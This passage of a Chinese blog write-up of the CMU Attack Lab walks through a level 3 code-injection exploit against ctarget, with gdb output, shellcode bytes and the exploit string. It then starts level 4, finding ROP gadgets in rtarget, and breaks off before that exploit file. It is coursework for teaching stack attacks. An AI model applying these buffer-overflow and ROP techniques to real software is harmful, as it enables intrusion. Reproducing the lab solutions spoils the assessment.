class="params">(<span class="keyword">char</span> *sval)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  vlevel = <span class="number">3</span>; <span class="comment">/* Part of validation protocol */</span></span><br><span class="line">  <span class="keyword">if</span> (hexmatch(cookie, sval)) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Touch3!: You called touch3(\&quot;%s\&quot;)\n&quot;</span>, sval);</span><br><span class="line">    validate(<span class="number">3</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Misfire: You called touch3(\&quot;%s\&quot;)\n&quot;</span>, sval);</span><br><span class="line">    fail(<span class="number">3</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>你的任务是**让<code>ctarget</code>重定向至<code>touch3</code>并进入<code>validate</code>分支，而不是返回<code>test</code>**。</p>
+<p>一些忠告：</p>
+<ul>
+<li>你需要在字符串中包含<code>cookie</code>的字符串表示形式。 该字符串应包含8个十六进制数字（从最高位到最低位），并且前导“<code>0x</code>”。</li>
+<li>回想一下，一个字符串在C中表示为字节序列，后跟一个值为0的字节。在任何Linux机器上都可以使用“<code>man ascii</code>”查看所需字符的字节表示。</li>
+<li>你注入的代码应将寄存器<code>％rdi</code>设置为该字符串的<strong>地址</strong>。</li>
+<li>调用函数<code>hexmatch</code>和<code>strncmp</code>时，它们会将数据压入堆栈，覆盖保留<code>getbuf</code>使用的缓冲区的内存部分。 因此，你需要注意放置<code>cookie</code>的字符串表示形式的位置。</li>
+</ul>
+</blockquote>
+<p><code>level 3</code>和<code>level 2</code>差不多，只不过传参为字符串而不是数值（<code>cookie</code>已知）。</p>
+<p>观察<code>touch3</code>函数：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">touch3</span><span class="params">(<span class="keyword">char</span> *sval)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  vlevel = <span class="number">3</span>; <span class="comment">/* Part of validation protocol */</span></span><br><span class="line">  <span class="keyword">if</span> (hexmatch(cookie, sval)) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Touch3!: You called touch3(\&quot;%s\&quot;)\n&quot;</span>, sval);</span><br><span class="line">    validate(<span class="number">3</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Misfire: You called touch3(\&quot;%s\&quot;)\n&quot;</span>, sval);</span><br><span class="line">    fail(<span class="number">3</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>发现应使表达式<code>hexmatch(cookie, sval)</code>的值为1。观察<code>hexmatch</code>函数：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Compare string to hex represention of unsigned value */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">hexmatch</span><span class="params">(<span class="keyword">unsigned</span> val, <span class="keyword">char</span> *sval)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> cbuf[<span class="number">110</span>];</span><br><span class="line">  <span class="comment">/* Make position of check string unpredictable */</span></span><br><span class="line">  <span class="keyword">char</span> *s = cbuf + random() % <span class="number">100</span>;</span><br><span class="line">  <span class="built_in">sprintf</span>(s, <span class="string">&quot;%.8x&quot;</span>, val);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">strncmp</span>(sval, s, <span class="number">9</span>) == <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><a target="_blank" rel="noopener" href="http://www.cplusplus.com/reference/cstring/strncmp/">什么是<code>strncmp</code>函数？</a></p>
+<p><a target="_blank" rel="noopener" href="http://www.cplusplus.com/reference/cstdio/sprintf/">什么是<code>sprintf</code>函数？</a></p>
+<p>结合返回值为1可知<code>strncmp(sval, s, 9) == 0</code>须成立，故参数<code>sval</code>字符串就应该是<code>cookie</code>值对应的字符串。结合ASCII表，可知<code>cookie</code>值<code>0x59b997fa</code>对应字符串的十六进制值为<code>35 39 62 39 39 37 66 61 00</code>（无前导“<code>0x</code>”）。</p>
+<hr>
+<p>但是此处故意“Make position of check string unpredictable”——<code>char *s = cbuf + random() % 100;</code>，造成字符串<code>s</code>的位置变为随机而不可预知，再加上函数<code>touch3</code>、<code>hexmatch</code>和<code>strncmp</code>的一系列压栈导致<code>getbuf</code>缓冲区中的数据可能被重写。这样看来我们不能将<code>cookie</code>值对应的字符串放在<code>getbuf</code>缓冲区中。</p>
+<hr>
+<p>由于<code>test</code>函数调用了<code>getbuf</code>函数，我们可以将输入的字符串存放到<code>test</code>的栈帧中。和<code>level 2</code>寻找缓冲区起始地址类似，我们寻找<code>test</code>缓冲区的起始地址（输入和输出一同显示）：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">gdb ctarget</span><br><span class="line">GNU gdb (Ubuntu 8.1-0ubuntu3.2) 8.1.0.20180409-git</span><br><span class="line">Copyright (C) 2018 Free Software Foundation, Inc.</span><br><span class="line">License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;</span><br><span class="line">This is free software: you are free to change and redistribute it.</span><br><span class="line">There is NO WARRANTY, to the extent permitted by law.  Type &quot;show copying&quot;</span><br><span class="line">and &quot;show warranty&quot; for details.</span><br><span class="line">This GDB was configured as &quot;x86_64-linux-gnu&quot;.</span><br><span class="line">Type &quot;show configuration&quot; for configuration details.</span><br><span class="line">For bug reporting instructions, please see:</span><br><span class="line">&lt;http://www.gnu.org/software/gdb/bugs/&gt;.</span><br><span class="line">Find the GDB manual and other documentation resources online at:</span><br><span class="line">&lt;http://www.gnu.org/software/gdb/documentation/&gt;.</span><br><span class="line">For help, type &quot;help&quot;.</span><br><span class="line">Type &quot;apropos word&quot; to search for commands related to &quot;word&quot;...</span><br><span class="line">Reading symbols from ctarget...done.</span><br><span class="line">(gdb) b test</span><br><span class="line">Breakpoint 1 at 0x401968: file visible.c, line 90.</span><br><span class="line">(gdb) r -q</span><br><span class="line">Starting program: /media/psf/Home/Documents/Documents_Mac/Basis of Computer Systems/homework4_target1/ctarget -q</span><br><span class="line">Cookie: 0x59b997fa</span><br><span class="line"></span><br><span class="line">Breakpoint 1, test () at visible.c:90</span><br><span class="line">90      visible.c: 没有那个文件或目录.</span><br><span class="line">(gdb) si</span><br><span class="line">92      in visible.c</span><br><span class="line">(gdb) p/x $rsp</span><br><span class="line"><span class="meta">$</span><span class="bash">1 = 0x5561dca8</span></span><br></pre></td></tr></table></figure>
+<p>得到缓冲区起始地址为<code>0x5561dca8</code>。</p>
+<p>其实也可以由<code>getbuf</code>缓冲区起始地址<code>0x5561dc78</code>推算而来：<code>getbuf</code>函数分配了<code>0x28</code>字节大小的内存，<code>0x5561dc78+0x28=0x5561dca0</code>即为返回值的起始地址，也就是我们经常利用的40字节之外的缓冲区溢出部分的起始地址，此部分为8字节大小空间，<code>0x5561dca0+0x8=0x5561dca8</code>就是<code>test</code>缓冲区的起始地址。</p>
+<p>这样我们又可以发现，在输入的字符串的40+8=48字节之外，再输入即可重写以地址<code>0x5561dca8</code>为起始的部分——就是我们要传入的字符串的地址。</p>
+<hr>
+<p><code>touch3</code>对应的汇编语句：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">00000000004018fa &lt;touch3&gt;:</span><br><span class="line">  ...</span><br></pre></td></tr></table></figure>
+<p>得到<code>touch3</code>的地址为<code>0x4018fa</code>。</p>
+<hr>
+<p>和<code>level 2</code>类似，编写汇编代码（<strong>注意末尾的空行</strong>）并保存为<code>touch3.s</code>文件（字符串传参为地址）：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mov    $0x5561dca8,%rdi    # string</span><br><span class="line">push   $0x4018fa           # touch3</span><br><span class="line">ret</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>汇编并反汇编：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc -c touch3.s</span><br><span class="line">objdump -d touch3.o</span><br></pre></td></tr></table></figure>
+<p>得到输出如下：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">touch3.o：     文件格式 elf64-x86-64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Disassembly of section .text:</span><br><span class="line"></span><br><span class="line">0000000000000000 &lt;.text&gt;:</span><br><span class="line">   0:   48 c7 c7 a8 dc 61 55    mov    $0x5561dca8,%rdi</span><br><span class="line">   7:   68 fa 18 40 00          pushq  $0x4018fa</span><br><span class="line">   c:   c3                      retq </span><br></pre></td></tr></table></figure>
+<p>至此，得到了汇编语句对应的字节码：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">48 c7 c7 a8 dc 61 55    /* mov    $0x5561dca8,%rdi */</span><br><span class="line">68 fa 18 40 00          /* pushq  $0x4018fa */</span><br><span class="line">c3                      /* retq */</span><br></pre></td></tr></table></figure>
+<hr>
+<p>和<code>level 2</code>类似，编辑用于攻击的字符串文件<code>exploit.txt</code>（<strong>注意注释周围的空格</strong>）：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">48 c7 c7 a8 dc 61 55 /* mov    $0x5561dca8,%rdi */</span><br><span class="line">68 fa 18 40 00 /* pushq  $0x4018fa */</span><br><span class="line">c3 /* retq */</span><br><span class="line">00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">78 dc 61 55 00 00 00 00 /* address of %rsp in getbuf */</span><br><span class="line">35 39 62 39 39 37 66 61 00 /* address of string */</span><br></pre></td></tr></table></figure>
+<p>再将保存的<code>exploit.txt</code>输入到<code>ctarget</code>：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat exploit.txt | ./hex2raw | ./ctarget -q</span><br></pre></td></tr></table></figure>
+<p>得到输出如下：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Cookie: 0x59b997fa</span><br><span class="line">Type string:Touch3!: You called touch3(&quot;59b997fa&quot;)</span><br><span class="line">Valid solution for level 3 with target ctarget</span><br><span class="line">PASS: Would have posted the following:</span><br><span class="line">        user id bovik</span><br><span class="line">        course  15213-f15</span><br><span class="line">        lab     attacklab</span><br><span class="line">        result  1:PASS:0xffffffff:ctarget:3:48 C7 C7 A8 DC 61 55 68 FA 18 40 00 C3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 DC 61 55 00 00 00 00 35 39 62 39 39 37 66 61 00 </span><br></pre></td></tr></table></figure>
+<p>完成。</p>
+<h2 id="Using-hex2raw"><a href="#Using-hex2raw" class="headerlink" title="Using hex2raw"></a><span id = "hex2raw">Using <code>hex2raw</code></span></h2><p><code>hex2raw</code>将十六进制格式的字符串作为输入。在这种格式下，每个字节值由两个十六进制数字表示。 例如，字符串“<code>012345</code>”可以十六进制格式输入为“<code>30 31 32 33 34 35 00</code>”。（请记住，十进制数字<code>X</code>的ASCII码为<code>0x3X</code>，并且字符串的结尾由空字节指示。）</p>
+<p>传递给<code>hex2raw</code>的十六进制字符应由空格（空格或换行符）分隔。我们建议你在处理字符串的不同部分使用换行符分隔。 <code>hex2raw</code>支持C样式的块注释，因此你可以标记字符串的各个部分（<strong>确保在开始和结束注释字符串（“<code>/*</code> ”，“<code>*/</code>”）周围都留有空格，以便注释被忽略</strong>）。</p>
+<p>如果在文件<code>exploit.txt</code>中生成了十六进制格式的字符串，则可以通过几种不同方式将原始字符串应用于<code>ctarget</code>或<code>rtarget</code>：</p>
+<ol>
+<li><p>你可以设置一系列管道以将字符串通过<code>hex2raw</code>传递。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">unix&gt;</span><span class="bash"> cat exploit.txt | ./hex2raw | ./ctarget</span> </span><br></pre></td></tr></table></figure></li>
+<li><p>你可以将原始字符串存储在文件中并使用I/O重定向：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">unix&gt;</span><span class="bash"> ./hex2raw &lt; exploit.txt &gt; exploit-raw.txt</span></span><br><span class="line"><span class="meta">unix&gt;</span><span class="bash"> ./ctarget &lt; exploit-raw.txt</span></span><br></pre></td></tr></table></figure>
+<p>从<code>gdb</code>内部运行时，也可以使用这种方法：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">unix&gt;</span><span class="bash"> gdb ctarget</span></span><br><span class="line">(gdb) run &lt; exploit-raw.txt</span><br></pre></td></tr></table></figure></li>
+<li><p>你可以将原始字符串存储在文件中，并提供文件名作为命令行参数：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">unix&gt;</span><span class="bash"> ./hex2raw &lt; exploit.txt &gt; exploit-raw.txt</span></span><br><span class="line"><span class="meta">unix&gt;</span><span class="bash"> ./ctarget -i exploit-raw.txt</span></span><br></pre></td></tr></table></figure>
+<p>从<code>gdb</code>内部运行时，也可以使用这种方法。</p>
+</li>
+</ol>
+<p><a href="#hex2rawq">点此返回</a></p>
+<h2 id="Generating-Byte-Codes"><a href="#Generating-Byte-Codes" class="headerlink" title="Generating Byte Codes"></a><span id = "generate">Generating Byte Codes</span></h2><p>将<code>gcc</code>用作汇编器，将<code>objdump</code>用作反汇编器，可以方便地生成指令序列的字节码。例如，假设你编写的文件<code>example.s</code>包含以下汇编代码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># Example of hand-generated assembly code</span><br><span class="line">  pushq   $0xabcdef    # Push value onto stack</span><br><span class="line">  addq    $17,%rax     # Add 17 to %rax</span><br><span class="line">  movl    %eax,%edx    # Copy lower 32 bits to %edx</span><br></pre></td></tr></table></figure>
+<p>此代码可以包含指令和数据的混合。“<code>＃</code>”字符右侧的任何内容均为注释。</p>
+<p>你现在可以汇编和反汇编此文件：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">unix&gt;</span><span class="bash"> gcc -c example.s</span></span><br><span class="line"><span class="meta">unix&gt;</span><span class="bash"> objdump -d example.o &gt; example.d</span></span><br></pre></td></tr></table></figure>
+<p>生成的文件<code>example.d</code>包含以下内容：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">example.o: file format elf64-x86-64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Disassembly of section .text:</span><br><span class="line"></span><br><span class="line">0000000000000000 &lt;.text&gt;:</span><br><span class="line">  0: 68 ef cd ab 00    pushq  $0xabcdef</span><br><span class="line">  5: 48 83 c0 11       add    $0x11,%rax</span><br><span class="line">  9: 89 c2             mov    %eax,%edx</span><br></pre></td></tr></table></figure>
+<p>底部几行显示了根据汇编语言指令生成的机器代码。 每行的左侧都有一个十六进制数字，表示该指令的起始地址（从0开始），而“<code>:</code>”字符后的十六进制数字表示该指令的<strong>字节码</strong>。 因此，我们可以看到指令<code>push $0xABCDEF</code>具有十六进制格式的字节码<code>68 ef cd ab 00</code>。</p>
+<p>从此文件中，你可以获得代码的字节序列：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">68 ef cd ab 00 48 83 c0 11 89 c2</span><br></pre></td></tr></table></figure>
+<p>然后，可以将该字符串通过<code>hex2raw</code>传递，以生成目标程序的输入字符串。或者，你可以编辑<code>example.d</code>以忽略无关的值，并包含C样式的注释以提高可读性，从而得到：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">68 ef cd ab 00   /* pushq  $0xabcdef  */</span><br><span class="line">48 83 c0 11      /* add    $0x11,%rax */</span><br><span class="line">89 c2            /* mov    %eax,%edx  */</span><br></pre></td></tr></table></figure>
+<p>这也是在发送给目标程序之一之前可以通过<code>hex2raw</code>传递的有效输入。</p>
+<p><a href="#generateq">点此返回</a></p>
+<hr>
+<p>若只完成课程要求部分，则此时可以结束阅读。</p>
+<p>下面是课程要求外的部分。</p>
+<hr>
+<h1 id="Part-II-Return-Oriented-Programming"><a href="#Part-II-Return-Oriented-Programming" class="headerlink" title="Part II: Return-Oriented Programming"></a>Part II: Return-Oriented Programming</h1><blockquote>
+<p>对<code>rtarget</code>进行代码注入攻击比对<code>ctarget</code>进行难度要大得多，因为它使用两种技术来阻止此类攻击：</p>
+<ul>
+<li>它使用<strong>随机化</strong>，以使堆栈位置在一个行程与另一个行程之间有所不同。 这使得无法确定注入的代码将位于何处。</li>
+<li>它会将保存堆栈的内存部分标记为<strong>不可执行</strong>，因此，即使你可以将程序计数器设置为注入代码的开始，程序也会因<strong>段错误（segmentation fault）</strong>而失败。</li>
+</ul>
+<p>幸运的是，聪明的人已经设计了策略，可以通过<strong>执行现有代码而不是注入新代码</strong>来在程序中完成有用的事情。 这种方法的最一般形式称为<strong>面向返回编程（ROP）</strong>。 ROP的策略是<strong>在现有程序中标识由一个或多个指令以及指令<code>ret</code>组成的字节序列</strong>。 这样的段称为**<code>gadget</code>**。![设置要执行的<code>gadget</code>序列。 字节值<code>0xc3</code>对<code>ret</code>指令进行编码。](Attack-Lab/设置要执行的<code>gadget</code>序列。 字节值<code>0xc3</code>对<code>ret</code>指令进行编码。.png)上图说明了如何设置堆栈以执行n个<code>gadget</code>序列。在此图中，堆栈包含一系列<code>gadget</code>地址。每个<code>gadget</code>均由一系列指令字节组成，最后一个为<code>0xc3</code>，用于编码<code>ret</code>指令。当程序从该配置开始执行<code>ret</code>指令时，它将启动一系列<code>gadget</code>执行，其中<code>ret</code>指令位于每个<code>gadget</code>的末尾，从而导致程序跳至下一个小程序的开头。</p>
+<p><code>gadget</code>可以使用与编译器生成的汇编语句相对应的代码，尤其是在函数末尾的代码。在实践中，可能有一些有用的<code>gadget</code>，但不足以实现许多重要的操作。例如，编译后的函数极不可能在弹出之前将<code>popq ％rdi</code>作为其最后一条指令。幸运的是，对于面向字节的指令集（例如x86-64），通常可以通过从指令字节序列的其他部分提取模式来找到<code>gadget</code>。</p>
+<p>例如，一个版本的<code>rtarget</code>包含为以下C函数生成的代码：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">setval_210</span><span class="params">(<span class="keyword">unsigned</span> *p)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  *p = <span class="number">3347663060U</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>此功能对攻击系统有用的机会似乎很小。 但是，此功能的反汇编机器码显示了一个有趣的字节序列：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">0000000000400f15 &lt;setval_210&gt;:</span><br><span class="line">  400f15: c7 07 d4 48 89 c7    movl $0xc78948d4,(%rdi)</span><br><span class="line">  400f1b: c3    retq</span><br></pre></td></tr></table></figure>
+
+<p>字节序列<code>48 89 c7</code>对指令<code>movq ％rax，％rdi</code>进行编码。 （有关有用的movq指令的编码，请参见下图。）<img src="Attack-Lab/movq%E6%8C%87%E4%BB%A4%E7%9A%84%E7%BC%96%E7%A0%81.png" alt="movq指令的编码">此序列后跟字节值<code>c3</code>，该字节值对<code>ret</code>指令进行编码。 该函数从地址<code>0x400f15</code>开始，序列从该函数的第四个字节开始。 因此，该代码包含一个起始地址为<code>0x400f18</code>的<code>gadget</code>，该<code>gadget</code>会将寄存器<code>％rax</code>中的64位值复制到寄存器<code>％rdi</code>。</p>
+<p><code>rtarget</code>的代码在我们称为<code>gadget farm</code>的区域中包含许多与上面显示的<code>setval_210</code>函数相似的函数。 你的工作将是识别<code>gadget farm</code>中的有用<code>gadget</code>，并使用它们执行与<code>level 2</code>和<code>level 3</code>中类似的攻击。</p>
+<p>重要提示：<code>gadget farm</code>在<code>rtarget</code>副本中由函数<code>start_farm</code>和<code>end_farm</code>划分。 请勿尝试从程序代码的其他部分构造<code>gadget</code>。</p>
+</blockquote>
+<p><code>level 4</code>和<code>level 5</code>分别对应着<code>level 2</code>和<code>level 3</code>，区别是此时将对<code>rtarget</code>进行攻击，而不再是<code>ctarget</code>。<code>rtarget</code>开启了地址随机化和栈不可执行机制，我们将不能注入新的代码，但是我们可以将现有的代码转化为新的代码，即<strong>ROP</strong>方法。</p>
+<p>反汇编：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">objdump -d rtarget &gt; rtarget.s</span><br></pre></td></tr></table></figure>
+<h2 id="Level-4"><a href="#Level-4" class="headerlink" title="Level 4"></a>Level 4</h2><blockquote>
+<p>对于<code>level 4</code>，你将重复<code>level 2</code>的攻击，但是使用<code>gadget farm</code>中的<code>gadget</code>在<code>rtarget</code>上进行此操作。 你可以使用由以下指令类型组成的<code>gadget</code>并仅使用前八个x86-64寄存器（<code>％rax</code>–<code>％rdi</code>）来构建解决方案。<br><code>movq</code>：这些代码在下图A中显示。<br><code>popq</code>：这些代码在下图B中显示。<img src="Attack-Lab/%E5%9B%BE3A-B.png" alt="图3A-B"><br><code>ret</code>：该指令由单字节<code>0xc3</code>编码。<br><code>nop</code>：该指令（发音为“ no op”，缩写为“ no operation”）由单字节<code>0x90</code>编码。 唯一的作用是使程序计数器加1。</p>
+<p>一些忠告：</p>
+<ul>
+<li>你所需的所有<code>gadget</code>都可以在函数<code>start_farm</code>和<code>mid_farm</code>划定的<code>rtarget</code>的代码区域中找到。</li>
+<li>你可以仅用两个<code>gadget</code>进行这种攻击。</li>
+<li>当<code>gadget</code>使用<code>popq</code>指令时，它将从堆栈中弹出数据。 结果，你的漏洞利用字符串将包含<code>gadget</code>地址和数据的组合。</li>
+</ul>
+</blockquote>
+<p>目的与<code>level 2</code>相同，即用字符串执行<code>touch2</code>函数，并使参数<code>val</code>等于<code>cookie</code>值。</p>
+<p>由于不能注入我们自己编写的代码，我们需要从<code>rtarget.s</code>中的<code>&lt;start_farm&gt;</code>（401994）和<code>&lt;end_farm&gt;</code>（401ab2）之间寻求已有的代码作为替代。类似地，利用<code>getbuf</code>的缓冲区溢出漏洞，将找到替代的代码<strong>地址</strong>直接置于40字节之后。</p>
+<p>回忆我们在<code>level 2</code>中编写的代码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov    $0x59b997fa,%rdi    # cookie</span><br><span class="line">push   $0x4017ec           # touch2</span><br><span class="line">ret</span><br></pre></td></tr></table></figure>
+<p>思路是先将<code>cookie</code>值传入<code>%rdi</code>，再跳转到<code>touch2</code>地址即可。</p>
+<hr>
+<p>现在不可以直接将一个特定立即数传给某寄存器，所以先将此立即数保存在栈中，再<code>pop</code>到指定寄存器。<img src="Attack-Lab/%E5%9B%BE3B.png" alt="图3B"></p>
+<p>观察上图，并寻找含有<code>58</code>～<code>5f</code>的语句：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">00000000004019a7 &lt;addval_219&gt;:</span><br><span class="line">  4019a7:	8d 87 51 73 58 90    	lea    -0x6fa78caf(%rdi),%eax</span><br><span class="line">  4019ad:	c3                   	retq</span><br></pre></td></tr></table></figure>
+<p>此处的<code>58 90 c3</code>对应：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">popq    %rax</span><br><span class="line">nop</span><br><span class="line">ret</span><br></pre></td></tr></table></figure>
+<p>我们找到了可以<code>pop</code>到<code>%rax</code>寄存器的指令，地址为<code>4019a7+4=4019ab</code>。</p>
+<hr>
+<p>然后我们寻找可以实现<code>%rax</code>-&gt;…-&gt;<code>%rdi</code>的指令。<img src="Attack-Lab/%E5%9B%BE3A.png" alt="图3A"></p>
+<p>观察上图，如果有<code>48 89 c7</code>最好，如果没有则需要多传递几次。寻找结果：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">00000000004019a0 &lt;addval_273&gt;:</span><br><span class="line">  4019a0:	8d 87 48 89 c7 c3    	lea    -0x3c3876b8(%rdi),%eax</span><br><span class="line">  4019a6:	c3                   	retq  </span><br></pre></td></tr></table></figure>
+<p>此处的<code>48 89 c7 c3</code>对应：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">movq    %rax,%rdi</span><br><span class="line">ret</span><br></pre></td></tr></table></figure>
+<p>地址为<code>4019a0+2=4019a2</code>。</p>
+<hr>
+<p>将得到的各个<code>gadget</code>进行总结：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">popq    %rax      # 4019ab</span><br><span class="line">                  # cookie</span><br><span class="line">movq    %rax,%rdi # 4019a2</span><br><span class="line">                  # address of touch2</span><br></pre></td></tr></table></figure>
+<p>其中<code>cookie</code>为<code>59b997fa</code>，<code>touch2</code>的地址为<code>4017ec</code>。</p>
+<hr>
+<p>编辑用于攻击的字符串文件<code>exploit.txt</code>（<strong>注意注释周围的空格</strong>）：</p>
